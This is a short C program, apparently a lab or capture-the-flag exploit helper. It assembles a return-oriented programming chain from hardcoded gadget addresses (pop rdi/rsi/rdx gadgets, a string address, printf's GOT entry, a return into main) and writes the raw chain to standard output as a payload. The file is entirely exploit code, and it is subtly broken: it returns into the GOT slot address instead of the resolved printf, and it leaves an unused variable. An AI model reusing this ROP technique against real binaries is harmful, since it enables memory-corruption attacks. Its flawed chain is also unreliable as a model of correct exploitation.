#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define POP_RDI_RET 0x00000000004006b1  // pop rdi; ret;
#define POP_RSI_RET 0x00000000004006b3  // pop rsi; pop r15; ret;
#define POP_RDX_RET 0x00000000004006b5  // pop rdx; pop r9; ret;
#define STR_ADDR    0x0000000000601040  // address of string "Hello, world!"
#define PRINTF_GOT  0x0000000000601020  // address of printf@got.plt
#define MAIN_RET    0x00000000004005f6  // address of main+71

int main(int argc, char *argv[]) {
  void *buf = malloc(200);
  void *func;

  func = &printf;

  // Write the ROP chain into the buffer.
  long *rop = (long *)buf;
  rop[0] = POP_RDI_RET;
  rop[1] = STR_ADDR;
  rop[2] = POP_RSI_RET;
  rop[3] = 0;
  rop[4] = 0;
  rop[5] = POP_RDX_RET;
  rop[6] = 0;
  rop[7] = 0;
  rop[8] = PRINTF_GOT;
  rop[9] = MAIN_RET;

  // Copy the buffer to the standard output.
  write(1, buf, 200);

  return 0;
}
